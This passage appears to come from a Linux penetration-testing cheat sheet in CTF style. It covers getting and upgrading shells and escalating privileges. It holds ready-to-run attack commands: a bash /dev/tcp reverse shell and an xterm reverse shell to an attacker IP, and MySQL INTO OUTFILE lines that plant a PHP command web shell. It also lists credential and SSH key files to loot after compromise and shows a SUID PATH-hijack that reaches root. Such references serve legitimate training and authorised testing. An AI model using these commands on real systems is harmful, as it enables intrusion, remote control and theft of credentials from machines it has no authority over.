<div class="highlight-default"><div class="highlight"><pre><span></span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">bash</span> <span class="o">-</span><span class="n">i</span> <span class="o">&gt;&amp;/</span><span class="n">dev</span><span class="o">/</span><span class="n">tcp</span><span class="o">/</span><span class="n">IP</span><span class="o">/</span><span class="n">Port</span> <span class="mi">0</span><span class="o">&gt;&amp;</span><span class="mi">1</span>
</pre></div>
</div>
</div>
<div class="section" id="xterm">
<h4>XTerm<a class="headerlink" href="#xterm" title="Permalink to this headline">¶</a></h4>
<p>One of the simplest forms of reverse shell is an xterm session. The following command should be run on the server. It will try to connect back to you (10.0.0.1) on TCP port 6001.</p>
<div class="highlight-bash"><div class="highlight"><pre><span></span>xterm -display <span class="m">10</span>.0.0.1:1
</pre></div>
</div>
<p>To catch the incoming xterm, start an X-Server (:1 – which listens on TCP port 6001). One way to do this is with Xnest (to be run on your system):</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">Xnest</span> <span class="p">:</span><span class="mi">1</span>
</pre></div>
</div>
<p>You’ll need to authorize the target to connect to you (command also run on your host):</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">xhost</span> <span class="o">+</span><span class="n">targetip</span>
</pre></div>
</div>
</div>
<div class="section" id="lynx">
<h4>Lynx<a class="headerlink" href="#lynx" title="Permalink to this headline">¶</a></h4>
<p>Obtain an interactive shell through lynx: It is possible to obtain an interactive shell via special LYNXDOWNLOAD URLs. This is a big security hole for sites that use lynx &#8220;guest accounts&#8221; and other public services. More details <a class="reference external" href="http://insecure.org/sploits/lynx.download.html">LynxShell</a></p>
<p>When you start up a lynx client session, you can hit &#8220;g&#8221; (for Goto) and then enter the following URL:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">URL</span> <span class="n">to</span> <span class="nb">open</span><span class="p">:</span> <span class="n">LYNXDOWNLOAD</span><span class="p">:</span><span class="o">//</span><span class="n">Method</span><span class="o">=-</span><span class="mi">1</span><span class="o">/</span><span class="n">File</span><span class="o">=/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span><span class="p">;</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">sh</span><span class="p">;</span><span class="o">/</span><span class="n">SugFile</span><span class="o">=/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span>
</pre></div>
</div>
</div>
<div class="section" id="mysql">
<h4>MYSQL<a class="headerlink" href="#mysql" title="Permalink to this headline">¶</a></h4>
<ul class="simple">
<li>If we have MYSQL Shell via sqlmap or phpmyadmin, we can use mysql outfile/ dumpfile function to upload a shell.</li>
</ul>
<blockquote>
<div><div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">echo</span> <span class="o">-</span><span class="n">n</span> <span class="s2">&quot;&lt;?php phpinfo(); ?&gt;&quot;</span> <span class="o">|</span> <span class="n">xxd</span> <span class="o">-</span><span class="n">ps</span> <span class="mi">3</span><span class="n">c3f70687020706870696e666f28293b203f3e</span>
<span class="n">select</span> <span class="mh">0x3c3f70687020706870696e666f28293b203f3e</span> <span class="n">into</span> <span class="n">outfile</span> <span class="s2">&quot;/var/www/html/blogblog/wp-content/uploads/phpinfo.php&quot;</span>
</pre></div>
</div>
<p>or</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">SELECT</span> <span class="s2">&quot;&lt;?php passthru($_GET[&#39;cmd&#39;]); ?&gt;&quot;</span> <span class="n">into</span> <span class="n">dumpfile</span> <span class="s1">&#39;/var/www/html/shell.php&#39;</span><span class="p">;</span>
</pre></div>
</div>
</div></blockquote>
<ul class="simple">
<li>If you have sql-shell from sqlmap/ phpmyadmin, we can use</li>
</ul>
<blockquote>
<div><div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">select</span> <span class="n">load_file</span><span class="p">(</span><span class="s1">&#39;/etc/passwd&#39;</span><span class="p">);</span>
</pre></div>
</div>
</div></blockquote>
</div>
</div>
<div class="section" id="spawning-a-tty-shell">
<h3>Spawning a TTY Shell<a class="headerlink" href="#spawning-a-tty-shell" title="Permalink to this headline">¶</a></h3>
<p>Spawning a TTY Shell and Post-Exploitation Without A TTY has provided multiple ways to get a tty shell</p>
<div class="section" id="id2">
<h4>Python<a class="headerlink" href="#id2" title="Permalink to this headline">¶</a></h4>
<div class="highlight-bash"><div class="highlight"><pre><span></span>python -c <span class="s1">&#39;import pty; pty.spawn(&quot;/bin/sh&quot;)&#39;</span>
</pre></div>
</div>
<p>or</p>
<div class="highlight-bash"><div class="highlight"><pre><span></span>python -c <span class="s1">&#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</span>
</pre></div>
</div>
<div class="highlight-bash"><div class="highlight"><pre><span></span>python -c <span class="s1">&#39;import os; os.system(&quot;/bin/bash&quot;)&#39;</span>
</pre></div>
</div>
</div>
<div class="section" id="sh">
<h4>sh<a class="headerlink" href="#sh" title="Permalink to this headline">¶</a></h4>
<div class="highlight-bash"><div class="highlight"><pre><span></span>/bin/sh -i
</pre></div>
</div>
</div>
<div class="section" id="id3">
<h4>Perl<a class="headerlink" href="#id3" title="Permalink to this headline">¶</a></h4>
<div class="highlight-bash"><div class="highlight"><pre><span></span>perl -e <span class="s1">&#39;exec &quot;/bin/sh&quot;;&#39;</span>
</pre></div>
</div>
<div class="highlight-bash"><div class="highlight"><pre><span></span>perl: <span class="nb">exec</span> <span class="s2">&quot;/bin/sh&quot;</span><span class="p">;</span>
</pre></div>
</div>
</div>
<div class="section" id="id4">
<h4>Ruby<a class="headerlink" href="#id4" title="Permalink to this headline">¶</a></h4>
<div class="highlight-bash"><div class="highlight"><pre><span></span>ruby: <span class="nb">exec</span> <span class="s2">&quot;/bin/sh&quot;</span>
</pre></div>
</div>
</div>
<div class="section" id="lua">
<h4>Lua<a class="headerlink" href="#lua" title="Permalink to this headline">¶</a></h4>
<div class="highlight-bash"><div class="highlight"><pre><span></span>lua: os.execute<span class="o">(</span><span class="s1">&#39;/bin/sh&#39;</span><span class="o">)</span>
</pre></div>
</div>
</div>
<div class="section" id="irb">
<h4>IRB<a class="headerlink" href="#irb" title="Permalink to this headline">¶</a></h4>
<p>(From within IRB)</p>
<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nb">exec</span> <span class="s2">&quot;/bin/sh&quot;</span>
</pre></div>
</div>
</div>
<div class="section" id="vi">
<h4>VI<a class="headerlink" href="#vi" title="Permalink to this headline">¶</a></h4>
<p>(From within vi)</p>
<div class="highlight-bash"><div class="highlight"><pre><span></span>:!bash
</pre></div>
</div>
<p>(From within vi)</p>
<div class="highlight-bash"><div class="highlight"><pre><span></span>:set <span class="nv">shell</span><span class="o">=</span>/bin/bash:shell
</pre></div>
</div>
<p>Also, if we execute</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">vi</span> <span class="p">;</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">bash</span>
</pre></div>
</div>
<p>Once, we exit vi, we would get shell. Helpful in scenarios where the user is asked to input which file to open.</p>
</div>
<div class="section" id="id5">
<h4>Nmap<a class="headerlink" href="#id5" title="Permalink to this headline">¶</a></h4>
<p>(From within nmap)</p>
<div class="highlight-bash"><div class="highlight"><pre><span></span>!sh
</pre></div>
</div>
</div>
<div class="section" id="expect">
<h4>Expect<a class="headerlink" href="#expect" title="Permalink to this headline">¶</a></h4>
<p>Using “Expect” To Get A TTY</p>
<div class="highlight-bash"><div class="highlight"><pre><span></span>$ cat sh.exp
<span class="c1">#!/usr/bin/expect</span>
<span class="c1"># Spawn a shell, then allow the user to interact with it.</span>
<span class="c1"># The new shell will have a good enough TTY to run tools like ssh, su and login</span>
spawn sh
interact
</pre></div>
</div>
</div>
<div class="section" id="sneaky-stealthy-su-in-web-shells">
<h4>Sneaky Stealthy SU in (Web) Shells<a class="headerlink" href="#sneaky-stealthy-su-in-web-shells" title="Permalink to this headline">¶</a></h4>
<p>Let&#8217;s say we have a webshell on the server ( probably, we would be logged in as a apache user), however, if we have credentials of another user, and we want to login we need a tty shell. We can use a shell terminal trick that relies on Python to turn our non-terminal shell into a terminal shell.</p>
<p><strong>Example</strong></p>
<p>Webshell like</p>
<div class="highlight-default"><div class="highlight"><pre><span></span>http://IP/shell.php?cmd=id
</pre></div>
</div>
<p>If we try</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">echo</span> <span class="n">password</span> <span class="o">|</span> <span class="n">su</span> <span class="o">-</span><span class="n">c</span> <span class="n">whoami</span>
</pre></div>
</div>
<p>Probably will get</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">standard</span> <span class="ow">in</span> <span class="n">must</span> <span class="n">be</span> <span class="n">a</span> <span class="n">tty</span>
</pre></div>
</div>
<p>The su command would work from a terminal, however, would not take in raw stuff via the shell&#8217;s Standard Input.</p>
<p>We can use a shell terminal trick that relies on Python to turn our non-terminal shell into a terminal shell</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="p">(</span><span class="n">sleep</span> <span class="mi">1</span><span class="p">;</span> <span class="n">echo</span> <span class="n">password</span><span class="p">)</span> <span class="o">|</span> <span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s2">&quot;import pty; pty.spawn([&#39;/bin/su&#39;,&#39;-c&#39;,&#39;whoami&#39;]);&quot;</span>
<span class="n">root</span>
</pre></div>
</div>
<p>The above has been referenced from SANS <a class="reference external" href="https://pen-testing.sans.org/blog/2014/07/08/sneaky-stealthy-su-in-web-shells#">Sneaky Stealthy SU in (Web) Shells</a></p>
</div>
</div>
<div class="section" id="gather-information-from-files">
<h3>Gather information from files<a class="headerlink" href="#gather-information-from-files" title="Permalink to this headline">¶</a></h3>
<p>In case of LFI or unprivileged shell, gathering information could be very useful. Mostly taken from <a class="reference external" href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/">g0tmi1k Linux Privilege Escalation Blog</a></p>
<div class="section" id="operating-system">
<h4>Operating System<a class="headerlink" href="#operating-system" title="Permalink to this headline">¶</a></h4>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">issue</span>
<span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/*-</span><span class="n">release</span>
  <span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">lsb</span><span class="o">-</span><span class="n">release</span>      <span class="c1"># Debian based</span>
  <span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">redhat</span><span class="o">-</span><span class="n">release</span>   <span class="c1"># Redhat based</span>
</pre></div>
</div>
</div>
<div class="section" id="proc-variables">
<h4>/Proc Variables<a class="headerlink" href="#proc-variables" title="Permalink to this headline">¶</a></h4>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">proc</span><span class="o">/</span><span class="n">sched_debug</span>       <span class="n">This</span> <span class="ow">is</span> <span class="n">usually</span> <span class="n">enabled</span> <span class="n">on</span> <span class="n">newer</span> <span class="n">systems</span><span class="p">,</span> <span class="n">such</span> <span class="k">as</span> <span class="n">RHEL</span> <span class="mf">6.</span>  <span class="n">It</span> <span class="n">provides</span> <span class="n">information</span> <span class="k">as</span> <span class="n">to</span> <span class="n">what</span> <span class="n">process</span> <span class="ow">is</span> <span class="n">running</span> <span class="n">on</span> <span class="n">which</span> <span class="n">cpu</span><span class="o">.</span>  <span class="n">This</span> <span class="n">can</span> <span class="n">be</span> <span class="n">handy</span> <span class="n">to</span> <span class="n">get</span> <span class="n">a</span> <span class="nb">list</span> <span class="n">of</span> <span class="n">processes</span> <span class="ow">and</span> <span class="n">their</span> <span class="n">PID</span> <span class="n">number</span><span class="o">.</span>
<span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="n">mounts</span>           <span class="n">Provides</span> <span class="n">a</span> <span class="nb">list</span> <span class="n">of</span> <span class="n">mounted</span> <span class="n">file</span> <span class="n">systems</span><span class="o">.</span>  <span class="n">Can</span> <span class="n">be</span> <span class="n">used</span> <span class="n">to</span> <span class="n">determine</span> <span class="n">where</span> <span class="n">other</span> <span class="n">interesting</span> <span class="n">files</span> <span class="n">might</span> <span class="n">be</span> <span class="n">located</span>
<span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="n">net</span><span class="o">/</span><span class="n">arp</span>          <span class="n">Shows</span> <span class="n">the</span> <span class="n">ARP</span> <span class="n">table</span><span class="o">.</span>  <span class="n">This</span> <span class="ow">is</span> <span class="n">one</span> <span class="n">way</span> <span class="n">to</span> <span class="n">find</span> <span class="n">out</span> <span class="n">IP</span> <span class="n">addresses</span> <span class="k">for</span> <span class="n">other</span> <span class="n">internal</span> <span class="n">servers</span><span class="o">.</span>
<span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="n">net</span><span class="o">/</span><span class="n">route</span>        <span class="n">Shows</span> <span class="n">the</span> <span class="n">routing</span> <span class="n">table</span> <span class="n">information</span><span class="o">.</span>
<span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="n">net</span><span class="o">/</span><span class="n">tcp</span>
<span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="n">net</span><span class="o">/</span><span class="n">udp</span>          <span class="n">Provides</span> <span class="n">a</span> <span class="nb">list</span> <span class="n">of</span> <span class="n">active</span> <span class="n">connections</span><span class="o">.</span>  <span class="n">Can</span> <span class="n">be</span> <span class="n">used</span> <span class="n">to</span> <span class="n">determine</span> <span class="n">what</span> <span class="n">ports</span> <span class="n">are</span> <span class="n">listening</span> <span class="n">on</span> <span class="n">the</span> <span class="n">server</span>
<span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="n">net</span><span class="o">/</span><span class="n">fib_trie</span>     <span class="n">This</span> <span class="ow">is</span> <span class="n">used</span> <span class="k">for</span> <span class="n">route</span> <span class="n">caching</span><span class="o">.</span>  <span class="n">This</span> <span class="n">can</span> <span class="n">also</span> <span class="n">be</span> <span class="n">used</span> <span class="n">to</span> <span class="n">determine</span> <span class="n">local</span> <span class="n">IPs</span><span class="p">,</span> <span class="k">as</span> <span class="n">well</span> <span class="k">as</span> <span class="n">gain</span> <span class="n">a</span> <span class="n">better</span> <span class="n">understanding</span> <span class="n">of</span> <span class="n">the</span> <span class="n">target</span><span class="s1">&#39;s networking structure</span>
<span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="n">version</span>          <span class="n">Shows</span> <span class="n">the</span> <span class="n">kernel</span> <span class="n">version</span><span class="o">.</span>  <span class="n">This</span> <span class="n">can</span> <span class="n">be</span> <span class="n">used</span> <span class="n">to</span> <span class="n">help</span> <span class="n">determine</span> <span class="n">the</span> <span class="n">OS</span> <span class="n">running</span> <span class="ow">and</span> <span class="n">the</span> <span class="n">last</span> <span class="n">time</span> <span class="n">it</span><span class="s1">&#39;s been fully updated.</span>
</pre></div>
</div>
<p>Each process also has its own set of attributes.  If we have the PID number and access to that process, then we can obtain some useful information about it, such as its environmental variables and any command line options that were run.  Sometimes these include passwords.  Linux also has a special proc directory called self which can be used to query information about the current process without having to know it&#8217;s PID.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="p">[</span><span class="n">PID</span><span class="p">]</span><span class="o">/</span><span class="n">cmdline</span>    <span class="n">Lists</span> <span class="n">everything</span> <span class="n">that</span> <span class="n">was</span> <span class="n">used</span> <span class="n">to</span> <span class="n">invoke</span> <span class="n">the</span> <span class="n">process</span><span class="o">.</span> <span class="n">This</span> <span class="n">sometimes</span> <span class="n">contains</span> <span class="n">useful</span> <span class="n">paths</span> <span class="n">to</span> <span class="n">configuration</span> <span class="n">files</span> <span class="k">as</span> <span class="n">well</span> <span class="k">as</span> <span class="n">usernames</span> <span class="ow">and</span> <span class="n">passwords</span><span class="o">.</span>
<span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="p">[</span><span class="n">PID</span><span class="p">]</span><span class="o">/</span><span class="n">environ</span>    <span class="n">Lists</span> <span class="nb">all</span> <span class="n">the</span> <span class="n">environment</span> <span class="n">variables</span> <span class="n">that</span> <span class="n">were</span> <span class="nb">set</span> <span class="n">when</span> <span class="n">the</span> <span class="n">process</span> <span class="n">was</span> <span class="n">invoked</span><span class="o">.</span>  <span class="n">This</span> <span class="n">also</span> <span class="n">sometimes</span> <span class="n">contains</span> <span class="n">useful</span> <span class="n">paths</span> <span class="n">to</span> <span class="n">configuration</span> <span class="n">files</span> <span class="k">as</span> <span class="n">well</span> <span class="k">as</span> <span class="n">usernames</span> <span class="ow">and</span> <span class="n">passwords</span><span class="o">.</span>
<span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="p">[</span><span class="n">PID</span><span class="p">]</span><span class="o">/</span><span class="n">cwd</span>        <span class="n">Points</span> <span class="n">to</span> <span class="n">the</span> <span class="n">current</span> <span class="n">working</span> <span class="n">directory</span> <span class="n">of</span> <span class="n">the</span> <span class="n">process</span><span class="o">.</span>  <span class="n">This</span> <span class="n">may</span> <span class="n">be</span> <span class="n">useful</span> <span class="k">if</span> <span class="n">you</span> <span class="n">don</span><span class="s1">&#39;t know the absolute path to a configuration file.</span>
<span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="p">[</span><span class="n">PID</span><span class="p">]</span><span class="o">/</span><span class="n">fd</span><span class="o">/</span><span class="p">[</span><span class="c1">#]     Provides access to the file descriptors being used.  In some cases this can be used to read files that are opened by a process.</span>
</pre></div>
</div>
<p>The information about Proc variables has been taken from <a class="reference external" href="https://blog.netspi.com/directory-traversal-file-inclusion-proc-file-system/">Directory Traversal, File Inclusion, and The Proc File System</a></p>
</div>
<div class="section" id="environment-variables">
<h4>Environment Variables<a class="headerlink" href="#environment-variables" title="Permalink to this headline">¶</a></h4>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">profile</span>
<span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">bashrc</span>
<span class="n">cat</span> <span class="o">~/.</span><span class="n">bash_profile</span>
<span class="n">cat</span> <span class="o">~/.</span><span class="n">bashrc</span>
<span class="n">cat</span> <span class="o">~/.</span><span class="n">bash_logout</span>
</pre></div>
</div>
</div>
<div class="section" id="configuration-files">
<h4>Configuration Files<a class="headerlink" href="#configuration-files" title="Permalink to this headline">¶</a></h4>
<ul class="simple">
<li>Apache Web Server : Helps in figuring out the DocumentRoot where does your webserver files are?</li>
</ul>
<blockquote>
<div><div class="highlight-default"><div class="highlight"><pre><span></span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">apache2</span><span class="o">/</span><span class="n">apache2</span><span class="o">.</span><span class="n">conf</span>
<span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">apache2</span><span class="o">/</span><span class="n">sites</span><span class="o">-</span><span class="n">enabled</span><span class="o">/</span><span class="mi">000</span><span class="o">-</span><span class="n">default</span>
</pre></div>
</div>
</div></blockquote>
</div>
<div class="section" id="user-history">
<h4>User History<a class="headerlink" href="#user-history" title="Permalink to this headline">¶</a></h4>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="o">~/.</span><span class="n">bash_history</span>
<span class="o">~/.</span><span class="n">nano_history</span>
<span class="o">~/.</span><span class="n">atftp_history</span>
<span class="o">~/.</span><span class="n">mysql_history</span>
<span class="o">~/.</span><span class="n">php_history</span>
<span class="o">~/.</span><span class="n">viminfo</span>
</pre></div>
</div>
</div>
<div class="section" id="private-ssh-keys-ssh-configuration">
<h4>Private SSH Keys / SSH Configuration<a class="headerlink" href="#private-ssh-keys-ssh-configuration" title="Permalink to this headline">¶</a></h4>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="o">~/.</span><span class="n">ssh</span><span class="o">/</span><span class="n">authorized_keys</span> <span class="p">:</span> <span class="n">specifies</span> <span class="n">the</span> <span class="n">SSH</span> <span class="n">keys</span> <span class="n">that</span> <span class="n">can</span> <span class="n">be</span> <span class="n">used</span> <span class="k">for</span> <span class="n">logging</span> <span class="n">into</span> <span class="n">the</span> <span class="n">user</span> <span class="n">account</span>
<span class="o">~/.</span><span class="n">ssh</span><span class="o">/</span><span class="n">identity</span><span class="o">.</span><span class="n">pub</span>
<span class="o">~/.</span><span class="n">ssh</span><span class="o">/</span><span class="n">identity</span>
<span class="o">~/.</span><span class="n">ssh</span><span class="o">/</span><span class="n">id_rsa</span><span class="o">.</span><span class="n">pub</span>
<span class="o">~/.</span><span class="n">ssh</span><span class="o">/</span><span class="n">id_rsa</span>
<span class="o">~/.</span><span class="n">ssh</span><span class="o">/</span><span class="n">id_dsa</span><span class="o">.</span><span class="n">pub</span>
<span class="o">~/.</span><span class="n">ssh</span><span class="o">/</span><span class="n">id_dsa</span>
<span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">ssh</span><span class="o">/</span><span class="n">ssh_config</span>  <span class="p">:</span> <span class="n">OpenSSH</span> <span class="n">SSH</span> <span class="n">client</span> <span class="n">configuration</span> <span class="n">files</span>
<span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">ssh</span><span class="o">/</span><span class="n">sshd_config</span> <span class="p">:</span> <span class="n">OpenSSH</span> <span class="n">SSH</span> <span class="n">daemon</span> <span class="n">configuration</span> <span class="n">file</span>
</pre></div>
</div>
</div>
</div>
</div>
<div class="section" id="unprivileged-shell-to-privileged-shell">
<h2>Unprivileged shell to privileged shell<a class="headerlink" href="#unprivileged-shell-to-privileged-shell" title="Permalink to this headline">¶</a></h2>
<p>Probably, at this point of time, we would have unprivileged shell of user www-data. It would be a good idea to first check privilege escalation techniques from g0tm1lk blog such as if there are any binary executable with SUID bits, if there are any cron jobs running with root permissions.</p>
<p>If you have become a normal user of which you have a password, it would be a good idea to check sudo -l to check if there are any executables you have permission to run.</p>
<div class="section" id="privilege-escalation-from-g0tm1lk-blog">
<h3>Privilege escalation from g0tm1lk blog<a class="headerlink" href="#privilege-escalation-from-g0tm1lk-blog" title="Permalink to this headline">¶</a></h3>
<div class="section" id="what-advanced-linux-file-permissions-are-used">
<h4>What &#8220;Advanced Linux File Permissions&#8221; are used?<a class="headerlink" href="#what-advanced-linux-file-permissions-are-used" title="Permalink to this headline">¶</a></h4>
<p>Sticky bits, SUID &amp; GUID</p>
<div class="highlight-default"><div class="highlight"><pre><span></span>find / -perm -1000 -type d 2&gt;/dev/null   # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here.
find / -perm -g=s -type f 2&gt;/dev/null    # SGID (chmod 2000) - run as the group, not the user who started it.
find / -perm -u=s -type f 2&gt;/dev/null    # SUID (chmod 4000) - run as the owner, not the user who started it.

find / -perm -g=s -o -perm -u=s -type f 2&gt;/dev/null    # SGID or SUID
for i in `locate -r &quot;bin$&quot;`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2&gt;/dev/null; done    # Looks in &#39;common&#39; places: /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin and any other *bin, for SGID or SUID (Quicker search)

# find starting at root (/), SGID or SUID, not Symbolic links, only 3 folders deep, list with more detail and hide any errors (e.g. permission denied)
 find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2&gt;/dev/null
</pre></div>
</div>
</div>
<div class="section" id="where-can-written-to-and-executed-from">
<h4>Where can written to and executed from?<a class="headerlink" href="#where-can-written-to-and-executed-from" title="Permalink to this headline">¶</a></h4>
<p>A few &#8216;common&#8217; places: /tmp, /var/tmp, /dev/shm</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">find</span> <span class="o">/</span> <span class="o">-</span><span class="n">writable</span> <span class="o">-</span><span class="nb">type</span> <span class="n">d</span> <span class="mi">2</span><span class="o">&gt;/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span>      <span class="c1"># world-writeable folders</span>
<span class="n">find</span> <span class="o">/</span> <span class="o">-</span><span class="n">perm</span> <span class="o">-</span><span class="mi">222</span> <span class="o">-</span><span class="nb">type</span> <span class="n">d</span> <span class="mi">2</span><span class="o">&gt;/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span>     <span class="c1"># world-writeable folders</span>
<span class="n">find</span> <span class="o">/</span> <span class="o">-</span><span class="n">perm</span> <span class="o">-</span><span class="n">o</span> <span class="n">w</span> <span class="o">-</span><span class="nb">type</span> <span class="n">d</span> <span class="mi">2</span><span class="o">&gt;/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span>     <span class="c1"># world-writeable folders</span>

<span class="n">find</span> <span class="o">/</span> <span class="o">-</span><span class="n">perm</span> <span class="o">-</span><span class="n">o</span> <span class="n">x</span> <span class="o">-</span><span class="nb">type</span> <span class="n">d</span> <span class="mi">2</span><span class="o">&gt;/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span>     <span class="c1"># world-executable folders</span>

<span class="n">find</span> <span class="o">/</span> \<span class="p">(</span> <span class="o">-</span><span class="n">perm</span> <span class="o">-</span><span class="n">o</span> <span class="n">w</span> <span class="o">-</span><span class="n">perm</span> <span class="o">-</span><span class="n">o</span> <span class="n">x</span> \<span class="p">)</span> <span class="o">-</span><span class="nb">type</span> <span class="n">d</span> <span class="mi">2</span><span class="o">&gt;/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span>   <span class="c1"># world-writeable &amp; executable folders</span>
</pre></div>
</div>
</div>
<div class="section" id="any-problem-files">
<h4>Any &#8220;problem&#8221; files?<a class="headerlink" href="#any-problem-files" title="Permalink to this headline">¶</a></h4>
<p>Word-writeable, &#8220;nobody&#8221; files</p>
<div class="highlight-default"><div class="highlight"><pre><span></span>find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print   # world-writeable files
find /dir -xdev \( -nouser -o -nogroup \) -print   # Noowner files
</pre></div>
</div>
</div>
<div class="section" id="find-files-folder-owned-by-the-user">
<h4>Find files/ folder owned by the user<a class="headerlink" href="#find-files-folder-owned-by-the-user" title="Permalink to this headline">¶</a></h4>
<p>After compromising the machine with an unprivileged shell, /home would contains the users present on the system. Also, viewable by checking /etc/passwd. Many times, we do want to see if there are any files owned by those users outside their home directory.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">find</span> <span class="o">/</span> <span class="o">-</span><span class="n">user</span> <span class="n">username</span> <span class="mi">2</span><span class="o">&gt;</span> <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span>
<span class="n">find</span> <span class="o">/</span> <span class="o">-</span><span class="n">group</span> <span class="n">groupname</span> <span class="mi">2</span><span class="o">&gt;</span> <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span>
</pre></div>
</div>
<div class="admonition tip">
<p class="first admonition-title">Tip</p>
<p class="last">Find files by wheel/ adm users.</p>
</div>
</div>
</div>
<div class="section" id="execution-of-binary-from-relative-location-than-absolute">
<h3>Execution of binary from Relative location than Absolute<a class="headerlink" href="#execution-of-binary-from-relative-location-than-absolute" title="Permalink to this headline">¶</a></h3>
<p>If we figure out that a suid binary is running with relative locations ( for example let&#8217;s say backjob is running &#8220;id&#8221; and &#8220;scp /tmp/special <a class="reference external" href="mailto:ron&#37;&#52;&#48;ton&#46;home">ron<span>&#64;</span>ton<span>&#46;</span>home</a>&#8221; )( figured out by running strings on the binary ). The problem with this is, that it’s trying to execute a file/script/program on a RELATIVE location (opposed to an ABSOLUTE location like /sbin would be). And we will now exploit this to become root.</p>
<p>so we can create a file in temp:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">echo</span> <span class="s2">&quot;bash -i&quot;</span> <span class="o">&gt;&gt;</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="nb">id</span>

<span class="ow">or</span>

<span class="n">cp</span> <span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">sh</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="nb">id</span>
</pre></div>
</div>
<div class="highlight-default"><div class="highlight"><pre><span></span>www-data@yummy:/tmp$ cp /bin/sh id
www-data@yummy:/tmp$ export PATH=/tmp:$PATH
www-data@yummy:/tmp$ which id
/tmp/id
www-data@yummy:/tmp$ /opt/backjob
whoami
root
# /usr/bin/id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
</pre></div>
</div>
<p>By changing the PATH prior executing the vulnerable suid binary (i.e. the location, where Linux is searching for the relative located file), we force the system to look first into /tmp when searching for “scp” or &#8220;id&#8221; . So the chain of commands is: /opt/backjob switches user context to root (as it is suid) and tries to run “scp …” -&gt; Linux searches the filesystem according to its path (here: in /tmp first) -&gt; Our malicious /tmp/scp gets found and executed as root -&gt; A new bash opens with root privileges.</p>
<p>If we execute a binary without specifying an absolute paths, it goes in order of your $PATH variable. By default, it&#8217;s something like:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">sbin</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="nb">bin</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="p">:</span><span class="o">/</span><span class="n">sbin</span><span class="p">:</span><span class="o">/</span><span class="nb">bin</span>
</pre></div>
</div>
<p>It is important to see .bash_profile file which contains the $PATH</p>
</div>
<div class="section" id="symlink-creation">
<h3>Symlink Creation<a class="headerlink" href="#symlink-creation" title="Permalink to this headline">¶</a></h3>
